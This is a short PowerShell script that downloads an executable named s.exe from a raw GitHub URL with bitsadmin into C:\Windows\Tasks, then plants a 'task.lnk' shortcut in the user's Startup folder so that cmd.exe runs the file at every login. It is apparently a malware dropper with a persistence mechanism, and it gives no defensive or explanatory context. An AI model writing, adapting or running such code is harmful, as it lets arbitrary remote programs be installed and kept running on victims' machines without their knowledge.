[System.Diagnostics.Process]::Start("C:\Windows\System32\cmd.exe", "/c bitsadmin /transfer mydownloadjob /download /priority high https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/s.exe C:\Windows\Tasks\s.exe")

# Define the command
$command = 'C:\Windows\Tasks\s'

# Define the path for the shortcut
$shortcutName = "task.lnk"
$startupFolder = [System.Environment]::GetFolderPath('Startup')
$shortcutPath = Join-Path $startupFolder $shortcutName

# Create the WScript.Shell COM object to create the shortcut
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)

# Set the target path (cmd.exe) and arguments (the command to execute)
$shortcut.TargetPath = "cmd.exe"
$shortcut.Arguments = "/c $command"  # /c runs the command and closes the cmd window
$shortcut.IconLocation = "cmd.exe"   # Optional: use cmd.exe icon
$shortcut.Save()


